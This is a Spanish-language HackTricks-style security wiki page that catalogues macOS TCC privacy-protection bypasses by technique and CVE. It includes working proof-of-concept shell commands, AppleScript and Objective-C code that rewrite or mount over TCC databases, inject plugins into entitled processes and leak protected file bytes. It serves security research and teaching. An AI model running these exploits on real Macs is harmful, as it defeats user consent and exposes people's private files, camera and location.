# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

Para ver el almacenamiento de permisos de TCC y la atribución del emisor/destino de Automation, consulta la [descripción general de macOS TCC](../index.html#identify-apple-events-sender-and-target-grants).

## Por funcionalidad

### Bypass de escritura

Esto no es un bypass, simplemente así funciona TCC: **No protege contra la escritura**. Si Terminal **no tiene acceso de lectura al Escritorio de un usuario, aun así puede escribir en él**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

El **atributo extendido `com.apple.macl`** se añade al nuevo **archivo** para dar a la **app creadora** acceso de lectura.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Es posible **colocar una ventana sobre el aviso de TCC** para hacer que el usuario lo **acepte** sin darse cuenta. Puedes encontrar un PoC en [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Solicitud de TCC con un nombre arbitrario

Un atacante puede **crear apps con cualquier nombre** (por ejemplo, Finder, Google Chrome...) en **`Info.plist`** y hacer que soliciten acceso a una ubicación protegida por TCC. El usuario creerá que la aplicación legítima está solicitando este acceso.\
Además, es posible **quitar la app legítima del Dock y poner la falsa en su lugar**, de modo que, cuando el usuario haga clic en la falsa (que puede usar el mismo icono), esta podría llamar a la legítima, solicitar permisos de TCC y ejecutar malware, haciendo creer al usuario que la app legítima solicitó el acceso.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Más información y PoC en:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

De forma predeterminada, el acceso mediante **SSH solía tener "Full Disk Access"**. Para desactivarlo, debe aparecer en la lista, pero deshabilitado (quitarlo de la lista no elimina esos privilegios):<sup>[[2]](#references)</sup>

![Solicitud de TCC con un nombre arbitrario - SSH Bypass: De forma predeterminada, el acceso mediante SSH solía tener "Full Disk Access". Para desactivarlo, debe aparecer en la lista, pero deshabilitado (quitarlo...](<../../../../../images/image (1077).png>)

Aquí puedes encontrar ejemplos de cómo algunos **malwares han podido eludir esta protección**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Ten en cuenta que ahora, para poder habilitar SSH, necesitas **Full Disk Access**

### Gestión de extensiones - CVE-2022-26767

El atributo **`com.apple.macl`** se asigna a los archivos para dar a **una aplicación determinada permiso para leerlos**. Este atributo se establece al **arrastrar\&soltar** un archivo sobre una app o cuando un usuario hace **doble clic** en un archivo para abrirlo con la **aplicación predeterminada**.

Por lo tanto, un usuario podría **registrar una app maliciosa** para gestionar todas las extensiones y llamar a Launch Services para **abrir** cualquier archivo (de modo que la app maliciosa obtenga acceso de lectura).<sup>[[23]](#references)</sup>

### iCloud

El entitlement **`com.apple.private.icloud-account-access`** permite comunicarse con el servicio XPC **`com.apple.iCloudHelper`**, que **proporcionará tokens de iCloud**.

**iMovie** y **Garageband** tenían este entitlement, además de otros que lo permitían.

Para obtener más **información** sobre el exploit para **obtener tokens de iCloud** mediante ese entitlement, consulta la charla: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Filtración desde Spotlight importer mediante nombres de notificación de Darwin

Un Spotlight importer puede leer el archivo que Spotlight pasa a su callback `GetMetadataForFile`, incluso cuando un proceso normal sin Full Disk Access no puede leerlo. A diferencia de la [inyección de código en un proceso autorizado por TCC](../macos-tcc-credential-and-data-theft.md), esto requiere una foothold local capaz de instalar un importer y un evento de indexación de Spotlight coincidente. El importer está en sandbox, pero las notificaciones de Darwin que solo contienen nombres pueden transportar bytes a un listener fuera de ese sandbox. Este es un canal de data-leak, no una vía para obtener root ni acceso arbitrario a archivos desde el importer.<sup>[[24]](#references)</sup>

Declara el tipo de archivo objetivo en `CFBundleDocumentTypes` → `LSItemContentTypes` dentro del `Info.plist` del importer y, luego, instala el bundle en `~/Library/Spotlight/` o en `Contents/Library/Spotlight/` de una app. Comprueba el registro con `mdimport -L`. La [sección sobre Spotlight importer](../../../../macos-auto-start-locations.md#spotlight-plugins) describe la ubicación del bundle y la correspondencia de tipos de archivo. El importer solo recibe archivos para los que Spotlight lo selecciona; por lo general, un importer existente tiene prioridad. En macOS 26 Tahoe, `mdimport -i` no forzó de forma fiable la indexación recursiva inmediata en las pruebas reportadas, mientras que `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` solicitó volver a importar los UTI declarados por ese importer.<sup>[[24]](#references)</sup>

Para probar el canal, inicia un listener fuera del sandbox con `notifyutil -w TEST_TEST_TEST` y, luego, publica una notificación con `CFNotificationCenterGetDarwinNotifyCenter()` y los valores `NULL` para el objeto y `userInfo`. A diferencia de una notificación distribuida con una carga útil `userInfo`, la notificación de Darwin solo tiene su nombre. Para datos binarios, registra el listener externo para los nombres decimales del `0` al `255` mediante `notify_register_dispatch`; asigna a cada registro de callback su valor de byte. Dentro de `GetMetadataForFile`, lee únicamente el `pathToFile` proporcionado por Spotlight y envía cada byte como un nombre de notificación decimal:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

El listener reconstruye la secuencia de bytes en lugar de leer el archivo protegido por TCC. El PoC publicado recuperó los primeros 64 bytes de `knowledgeC.db` desde un terminal que no tenía FDA, con SIP habilitado en macOS 26. Este método tiene poco ancho de banda y no es fiable para copiar grandes cantidades de datos: Spotlight puede no indexar o volver a indexar un archivo objetivo, y las instancias simultáneas del importador pueden intercalar los flujos de notificaciones. Consulta [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) para conocer otros mecanismos que traspasan los límites del sandbox.<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automatización

Una app con el permiso **`kTCCServiceAppleEvents`** podrá **controlar otras apps**. Esto significa que podría **abusar de los permisos concedidos a esas otras apps**.<sup>[[2]](#references)</sup>

Para obtener más información sobre Apple Scripts, consulta:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Por ejemplo, si una app tiene **permiso de Automation sobre `iTerm`**, como en este ejemplo, **`Terminal`** tiene acceso a iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Sobre iTerm

Terminal, que no tiene FDA, puede llamar a iTerm, que sí lo tiene, y usarlo para realizar acciones:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### A través de Finder

O si una app tiene acceso a través de Finder, podría ejecutar un script como este:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Por comportamiento de la app

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

El **daemon tccd** en userland utilizaba la variable de entorno **`HOME`** para acceder a la base de datos de usuarios de TCC en: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Según [esta publicación de Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), y dado que el daemon TCC se ejecuta mediante `launchd` dentro del dominio del usuario actual, es posible **controlar todas las variables de entorno** que se le pasan.<sup>[[19]](#references)</sup>\
Por tanto, un **atacante podría establecer la variable de entorno `$HOME`** en **`launchctl`** para que apunte a un **directorio** **controlado**, **reiniciar** el daemon **TCC** y luego **modificar directamente la base de datos de TCC** para concederse a sí mismo **todos los permisos de TCC disponibles** sin que se le solicite permiso al usuario final.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notas

Notes tenía acceso a ubicaciones protegidas por TCC, pero una nota recién creada se **almacenaba en una ubicación no protegida**. Por lo tanto, un atacante podía pedirle a Notes que copiara un archivo protegido en una nota y luego acceder a los datos resultantes desde la ubicación no protegida:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

El binario `/usr/libexec/lsd`, junto con la biblioteca `libsecurity_translocate`, tenía el entitlement `com.apple.private.nullfs_allow`, que le permitía crear montajes **nullfs**, y el entitlement `com.apple.private.tcc.allow` con **`kTCCServiceSystemPolicyAllFiles`** para acceder a todos los archivos.

Era posible añadir el atributo de cuarentena a "Library", llamar al servicio XPC **`com.apple.security.translocation`** y, entonces, este asignaría Library a **`$TMPDIR/AppTranslocation/d/d/Library`**, desde donde se podía **acceder** a todos los documentos de Library.

### CVE-2024-44131 - FileProvider symlink race

Las aplicaciones que delegan las operaciones con archivos a un **helper privilegiado** (en este caso, **`fileproviderd`** / `Files.app`) copian o mueven elementos **en nombre del usuario**, por lo que la copia se ejecuta con los privilegios del helper en lugar de los del proceso que la solicita.

Jamf Threat Labs mostró que la validación de symlinks realizada antes de la operación puede sufrir una **race condition**: en lugar de colocar el symlink en el **último** componente de la ruta (que es el que se comprueba), el atacante sustituye un directorio **intermedio** de la ruta **después de que la copia ya haya comenzado**. El helper privilegiado sigue entonces el enlace controlado por el atacante y lee o escribe en ubicaciones protegidas por TCC **sin mostrar nunca un aviso**.<sup>[[5]](#references)</sup>

Los directorios que **no** están protegidos por un UUID aleatorio en su ruta (por ejemplo, `~/Library/Mobile Documents/com~apple~CloudDocs`) son los objetivos más fáciles, porque el atacante puede predecir la ruta completa para provocar la race condition.

> [!TIP]
> Este es el patrón genérico que hay que buscar: **cualquier proceso privilegiado que resuelva una ruta más de una vez** (comprobar y luego usarla, o cuando `rename()`/`copyfile()` resuelve por separado el origen y el destino) puede sufrir una race condition si se sustituye un directorio intermedio de la ruta. Solo `O_NOFOLLOW_ANY`, `openat()` sobre un FD de directorio ya abierto, o `realpath()` seguido de una nueva validación cierran realmente la ventana.

Más información en [**el artículo de Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` se puede compilar con `SQLITE_ENABLE_SQLLOG`, que añade un hook de registro controlado por variables de entorno ([`test_sqllog.c` de upstream](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`**: para **cada base de datos que se abra**, se escribe en `path` una **copia del archivo de la base de datos** y un registro de las instrucciones SQL (el directorio debe existir previamente).
- **`SQLITE_SQLLOG_REUSE_FILES=0`**: crear una **copia nueva cada vez** que se abre o adjunta una DB, en lugar de reutilizar una.
- **`SQLITE_SQLLOG_CONDITIONAL`**: registrar una conexión solo si existe un archivo `<database>-sqllog` junto a la DB principal.

Si puedes inyectar esta variable en un proceso que tenga **FDA** y abra bases de datos SQLite, este **copiará sin problemas esas bases de datos protegidas** a un directorio bajo tu control. Como el nombre del archivo de destino se deriva de datos controlados por el atacante, un **symlink colocado en el destino** convierte la misma primitiva en una **escritura arbitraria de archivos** con los privilegios del proceso objetivo.

### **SQLITE_AUTO_TRACE**

Si se establece la variable de entorno **`SQLITE_AUTO_TRACE`**, la biblioteca **`libsqlite3.dylib`** empezará a **registrar** todas las consultas SQL. Muchas aplicaciones utilizaban esta biblioteca, por lo que era posible registrar todas sus consultas SQLite.<sup>[[22]](#references)</sup>

Varias aplicaciones de Apple utilizaban esta biblioteca para acceder a información protegida por TCC.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### Búsqueda de escrituras de archivos controladas por variables de entorno

Las dos entradas anteriores son ejemplos de la misma técnica genérica, y vale la pena buscar más: **los frameworks cargados en apps con privilegios de TCC suelen exponer variables de entorno de depuración/registro que hacen que el proceso cree un archivo en una ruta controlada por quien lo invoca**.

Procedimiento para encontrarlas:

1. Elige un objetivo con FDA u otro permiso TCC valioso (`Music`, `TV`, `Terminal`, agentes MDM...) y enumera los frameworks que enlaza (`otool -L`, `vmmap`).
2. Busca cadenas de `getenv` en esos frameworks: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Configura las variables candidatas con `launchctl setenv NAME /path/you/control`, inicia la app y observa qué hace en el sistema de archivos con `fs_usage -w -f filesys <pid>` o `sudo fs_usage | grep <path>`.
4. Si el proceso **crea o renombra** un archivo en tu directorio, tienes una primitiva de escritura: apunta el destino a un symlink (o compite por una condición de carrera en un directorio intermedio, como en CVE-2024-44131 arriba) para redirigirlo a `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Hay dos limitaciones. Primero, **las variables `DYLD_*` se ignoran en binarios con hardened runtime**, a menos que la app incluya el entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) («un valor booleano que indica si la app puede verse afectada por variables de entorno del enlazador dinámico, que puedes usar para inyectar código en el proceso de tu app»); consulta también [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Segundo, Apple elimina variables de depuración específicas de cada framework cuando se reportan, así que una variable que funcionó en una versión de macOS suele desaparecer en la siguiente. Si una app se niega a iniciarse silenciosamente después de configurarla, considera que esa variable ya está filtrada.<sup>[[7]](#references)[[8]](#references)</sup>

Consulta [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) para ver el truco equivalente con variables del enlazador.

### Apple Remote Desktop

Como root, podrías habilitar este servicio y el **agente ARD tendrá acceso total al disco**; luego, un usuario podría aprovecharlo para hacer que copie una nueva **base de datos TCC del usuario**.

## Mediante **NFSHomeDirectory**

TCC utiliza una base de datos en la carpeta HOME del usuario para controlar el acceso a recursos específicos del usuario, en **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Por lo tanto, si el usuario consigue reiniciar TCC con una variable de entorno $HOME que apunte a una **carpeta diferente**, podría crear una nueva base de datos TCC en **/Library/Application Support/com.apple.TCC/TCC.db** y engañar a TCC para que conceda cualquier permiso TCC a cualquier app.

> [!TIP]
> Ten en cuenta que Apple utiliza el valor del atributo **`NFSHomeDirectory`** almacenado en el perfil del usuario como **valor de `$HOME`**; por eso, si comprometes una aplicación con permisos para modificar este valor (**`kTCCServiceSystemPolicySysAdminFiles`**), puedes **armar** esta opción para evadir TCC.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

La **primera POC** utiliza [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) y [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) para modificar la carpeta **HOME** del usuario.

1. Obtén un blob _csreq_ para la app objetivo.
2. Coloca un archivo _TCC.db_ falso con el acceso requerido y el blob _csreq_.
3. Exporta la entrada de Directory Services del usuario con [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modifica la entrada de Directory Services para cambiar el directorio home del usuario.
5. Importa la entrada de Directory Services modificada con [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Detén el _tccd_ del usuario y reinicia el proceso.

La segunda POC utilizó **`/usr/libexec/configd`**, que tenía `com.apple.private.tcc.allow` con el valor `kTCCServiceSystemPolicySysAdminFiles`.\
Era posible ejecutar **`configd`** con la opción **`-t`**, que permitía a un atacante especificar un **Bundle personalizado para cargar**. Por lo tanto, el exploit **reemplaza** el método de cambiar el directorio home del usuario mediante **`dsexport`** y **`dsimport`** por una **inyección de código en `configd`**.

Para más información, consulta el [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Mediante inyección de procesos

Hay distintas técnicas para inyectar código en un proceso y abusar de sus privilegios de TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Además, la técnica de inyección de procesos más común encontrada para evadir TCC es mediante **plugins (carga de bibliotecas)**.\
Los plugins son código adicional, generalmente en forma de bibliotecas o plist, que la **aplicación principal cargará** y ejecutará dentro de su contexto. Por lo tanto, si la aplicación principal tenía acceso a archivos restringidos por TCC (mediante permisos concedidos o entitlements), el **código personalizado también lo tendrá**.

### CVE-2020-27937 - Directory Utility

La aplicación `/System/Library/CoreServices/Applications/Directory Utility.app` tenía el entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, cargaba plugins con la extensión **`.daplug`** y **no tenía hardened runtime**.

Para armar este CVE, se **cambia** **`NFSHomeDirectory`** (abusando del entitlement anterior) para **apoderarse de la base de datos TCC del usuario** y evadir TCC.

Para más información, consulta el [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

El binario **`/usr/sbin/coreaudiod`** tenía los entitlements `com.apple.security.cs.disable-library-validation` y `com.apple.private.tcc.manager`. El primero **permitía la inyección de código** y el segundo le daba acceso para **gestionar TCC**.

Este binario permitía cargar **plugins de terceros** desde la carpeta `/Library/Audio/Plug-Ins/HAL`. Por lo tanto, era posible **cargar un plugin y abusar de los permisos de TCC** con esta PoC:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Para más información, consulta el [**informe original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Plug-ins de Device Abstraction Layer (DAL)

Las aplicaciones del sistema que abren un flujo de cámara mediante Core Media I/O (apps con **`kTCCServiceCamera`**) cargan **estos plug-ins en el proceso**, ubicados en `/Library/CoreMediaIO/Plug-Ins/DAL` (no están restringidos por SIP).

Basta con almacenar allí una biblioteca con el **constructor** habitual para **inyectar código**.

Varias aplicaciones de Apple eran vulnerables a esto.

### Firefox

La aplicación Firefox tenía los entitlements `com.apple.security.cs.disable-library-validation` y `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Para obtener más información sobre cómo explotarlo fácilmente, [**consulta el informe original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

El binario `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` tenía los entitlements **`com.apple.private.tcc.allow`** y **`com.apple.security.get-task-allow`**, lo que permitía inyectar código en el proceso y usar los privilegios de TCC.

### CVE-2023-26818 - Telegram

Telegram tenía los entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** y **`com.apple.security.cs.disable-library-validation`**, por lo que era posible abusar de ellos para **acceder a sus permisos**, como grabar con la cámara. Puedes [**encontrar el payload en el writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Observa cómo, para usar la variable de entorno y cargar una biblioteca, se creó un **plist personalizado** para inyectar dicha biblioteca y se usó **`launchctl`** para iniciarla:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Mediante invocaciones de open

Es posible invocar **`open`** incluso estando en sandbox

### Scripts de Terminal

Es bastante común conceder **Acceso total al disco (FDA)** a Terminal, al menos en computadoras utilizadas por personas del ámbito tecnológico. También es posible invocar scripts **`.terminal`** con ese acceso.

Los scripts **`.terminal`** son archivos plist como este, con el comando que se ejecutará en la clave **`CommandString`**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

Una aplicación podría escribir un script de terminal en una ubicación como /tmp y ejecutarlo con un comando como:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Mediante el montaje

### CVE-2020-9771 - bypass de TCC y escalada de privilegios con mount_apfs

**Cualquier usuario** (incluso los que no tienen privilegios) puede crear y montar una snapshot de Time Machine y **acceder a TODOS los archivos** de esa snapshot.\
El **único requisito de privilegios** es que la aplicación utilizada (como `Terminal`) tenga acceso de **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), que debe conceder un administrador.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

Una explicación más detallada se [**encuentra en el informe original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 y CVE-2021-30808 - Montar sobre el archivo TCC

Aunque el archivo de la base de datos TCC estuviera protegido, era posible **montar sobre el directorio** un nuevo archivo TCC.db:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Consulta el **exploit completo** en el [**writeup original**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Como se explica en el [writeup original](https://www.kandji.io/blog/macos-audit-story-part2), este CVE abusaba de `diskarbitrationd`.<sup>[[16]](#references)</sup>

La función `DADiskMountWithArgumentsCommon` del framework público `DiskArbitration` realizaba las comprobaciones de seguridad. Sin embargo, es posible eludirlas llamando directamente a `diskarbitrationd` y, por tanto, usar elementos `../` en la ruta y symlinks.

Esto permitía a un atacante realizar montajes arbitrarios en cualquier ubicación, incluso sobre la base de datos TCC, gracias al entitlement `com.apple.private.security.storage-exempt.heritable` de `diskarbitrationd`.

### asr

La herramienta **`/usr/sbin/asr`** permitía copiar todo el disco y montarlo en otro lugar, eludiendo las protecciones de TCC.

### CVE-2022-22655 - Servicios de ubicación

Los servicios de ubicación **no** se almacenan en una base de datos TCC como los demás servicios. Los administra `locationd`, que mantiene su propia lista de permitidos en **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Cada entrada está identificada por el cliente (bundle ID o ruta del ejecutable) y contiene campos como `Authorized`, `BundleId`, `Executable` y `Registered`.<sup>[[4]](#references)</sup>

El archivo `clients.plist` está protegido por Sandbox/TCC y no se puede editar ni siquiera como root, pero el directorio **`/var/db/locationd/` no estaba protegido contra el montaje**. Por lo tanto, un atacante que ejecutara código como root podía crear una imagen de disco con su propio `clients.plist` (con su binario marcado como `Authorized`), montarla sobre el directorio y reiniciar `locationd` para que se aplicara la lista de permitidos falsificada.<sup>[[3]](#references)</sup>

> [!TIP]
> Este es el mismo patrón que en los bypasses de TCC con `hdiutil`/`mount` anteriores: el *archivo* está protegido, pero el *directorio donde se encuentra* no, así que se reemplaza el directorio entero en lugar del archivo.

## Mediante aplicaciones de inicio


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Mediante grep

En varias ocasiones, los archivos almacenan información sensible como correos electrónicos, números de teléfono, mensajes... en ubicaciones no protegidas (lo que Apple considera una vulnerabilidad).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Esto ya no funciona, pero [**funcionaba en el pasado**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Otra forma de hacerlo mediante [**eventos de CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>



## References

